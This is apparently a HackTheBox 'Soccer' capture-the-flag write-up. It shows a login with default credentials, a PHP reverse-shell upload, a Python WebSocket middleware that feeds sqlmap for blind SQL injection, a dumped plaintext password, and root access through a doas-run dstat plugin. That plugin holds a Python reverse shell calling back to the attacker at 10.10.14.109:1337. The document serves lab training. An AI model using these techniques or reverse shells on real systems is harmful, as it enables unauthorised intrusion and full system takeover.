## Soccer


nmap reveal 3 ports 

```
Open Ports | Service Running
-----------|-----------------
22         | ssh
80         | http
9091       | xmltec-xmlmail
```

9092 is probably a ws://


in port 80 found a interstening directory /tiny 


and is made by —— © CCP Programmers —— 


find default credentials of CCP 



Default username/password: admin/admin@123 and user/12345


it worked with admin : admin@123



we got shell by uploadinf landum-php-reverse-shell in uploads and call it in http://soccer.htb/tiny/uploads/reverse.php


we impersonate www-data


we find an interesting subdomain in /etc/nginx/sites-enabled 


`soc-player.soccer.htb`

There are some options like Match, Login and Signup option Available

signup and login and i notice in source code that js is connecting in ws://


```js
<script>
        var ws = new WebSocket("ws://soc-player.soccer.htb:9091");
        window.onload = function () {
        
        var btn = document.getElementById('btn');
        var input = document.getElementById('id');
        
        ws.onopen = function (e) {
            console.log('connected to the server')
        }
        input.addEventListener('keypress', (e) => {
            keyOne(e)
        });
        
        function keyOne(e) {
            e.stopPropagation();
            if (e.keyCode === 13) {
                e.preventDefault();
                sendText();
            }
        }
        
        function sendText() {
            var msg = input.value;
            if (msg.length > 0) {
                ws.send(JSON.stringify({
                    "id": msg
                }))
            }
            else append("????????")
        }
        }
        
        ws.onmessage = function (e) {
        append(e.data)
        }
        
        function append(msg) {
        let p = document.querySelector("p");
        // let randomColor = '#' + Math.floor(Math.random() * 16777215).toString(16);
        // p.style.color = randomColor;
        p.textContent = msg
        }
    </script>

```

We can use the Below python code to direct the request from sqlmap to our localhost taken by this article
[link](https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html)



```py
from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer
from urllib.parse import unquote, urlparse
from websocket import create_connection

ws_server = "ws://soc-player.soccer.htb:9091"

def send_ws(payload):
	ws = create_connection(ws_server)
	# If the server returns a response on connect, use below line	
	#resp = ws.recv() # If server returns something like a token on connect you can find and extract from here
	
	# For our case, format the payload in JSON
	message = unquote(payload).replace('"','\'') # replacing " with ' to avoid breaking JSON structure
	data = '{"employeeID":"%s"}' % message

	ws.send(data)
	resp = ws.recv()
	ws.close()

	if resp:
		return resp
	else:
		return ''

def middleware_server(host_port,content_type="text/plain"):

	class CustomHandler(SimpleHTTPRequestHandler):
		def do_GET(self) -> None:
			self.send_response(200)
			try:
				payload = urlparse(self.path).query.split('=',1)[1]
			except IndexError:
				payload = False
				
			if payload:
				content = send_ws(payload)
			else:
				content = 'No parameters specified!'

			self.send_header("Content-type", content_type)
			self.end_headers()
			self.wfile.write(content.encode())
			return

	class _TCPServer(TCPServer):
		allow_reuse_address = True

	httpd = _TCPServer(host_port, CustomHandler)
	httpd.serve_forever()


print("[+] Starting MiddleWare Server")
print("[+] Send payloads in http://localhost:8081/?id=*")

try:
	middleware_server(('0.0.0.0',8081))
except KeyboardInterrupt:
	pass

```


1st we have to run this code and then `sqlmap -u “http://localhost:8081/?id=1" -p “id”`


account takeover success by dumping the database server and we find this creds


```
+------+-------------------+----------+----------------------+
| id   | email             | username | password             |
+------+-------------------+----------+----------------------+
| 1324 | player@player.htb | player   | PlayerOftheMatch2022 |
+------+-------------------+----------+----------------------+
```




## Player


ssh with player 


and we can privesc 


suid --> doas

in this [article](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/doas/)

```bash
cat /usr/local/etc/doas.conf 

permit nopass player as root cmd /usr/bin/dstat

```

```bash

find / -type d -name dstat  2>/dev/null`
```

find 2 directories only /usr/local/share/dstat is writable
and we put a python revese shell with name dstat_rs.py with this code 


```py
import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.10.14.109",1337));

os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);

import pty; pty.spawn("/bin/sh")
```


so if we `doas -u root /usr/bin/dstat --rs `we can gain access as root

call our code and we can take root flag












